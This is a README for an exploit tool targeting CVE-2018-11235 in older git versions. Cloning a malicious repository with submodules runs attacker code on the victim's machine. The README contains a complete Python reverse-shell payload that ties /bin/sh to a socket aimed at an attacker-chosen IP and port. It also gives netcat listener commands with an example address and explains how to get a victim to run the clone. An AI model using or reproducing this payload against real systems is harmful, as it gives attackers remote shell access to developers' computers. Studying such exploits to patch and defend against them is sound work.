Exploit for CVE-2018-11235 Usage
==============================

CVE-2018-11235, dubbed clone and pwn here, creates a malicious git repo that exploits a bug in git. When the repo is cloned using the
--recurse-submodules flag, arbitrary code is executed on git client versions In Git before 2.13.7, 2.14.x before 2.14.4, 2.15.x before
2.15.2, 2.16.x before 2.16.4, and 2.17.x before 2.17.1.

To use this module simply put it on a server with direct internet access (e.g. AWS, digital ocean) and pop open `evil.sh`. It will look
something like the following:

```
#!/usr/bin/python

EXTERN_IP="127.0.0.1"
EXTERN_PORT=8080

#reverse shell to IP EXTERN_IP and port EXTERN_PORT
import socket, subprocess, os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((EXTERN_IP, EXTERN_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Set EXTERN_IP and EXTERN_PORT to the IP (external) and port you'd like to receive your reverse shell on. A reverse shell can be received with something like:

`nc -l <EXTERN_IP> EXTERN_PORT` e.g. `nc -l 193.23.23.32 8080`

Or with Metasploit's generic shell module. Once the user has run the command `git clone --recurse-submodules git://<your ip>/repo dest_dir` you will receive a reverse shell.

If you're having trouble running multiple times (or after a failed attempt) check the following:

- Run ./clean.sh, note this will delete all data in /tmp
- check the processes with `ps aux | grep git` to ensure you aren't already running gitdaemon. Kill any gitdaemon processes.

Acknowledgements
----------------

Code derived from [@peff](https://github.com/peff)'s [git patch][] (look for
the `t/t7415-submodule-names.sh` test file).

As such, this repository is published under the GNU General Public License
version 2.

Additional fix for older versions of git courtesy of
[@atorralba](https://github.com/atorralba)
([details in this post](https://atorralba.github.io/CVE-2018-11235/)).

[git patch]: https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44

This script adapted from https://github.com/Rogdham/CVE-2018-11235, much love and credit

=======
# clone_and_pwn
Exploits CVE-2018-11235

By @_hyp3ri0n and @mehaase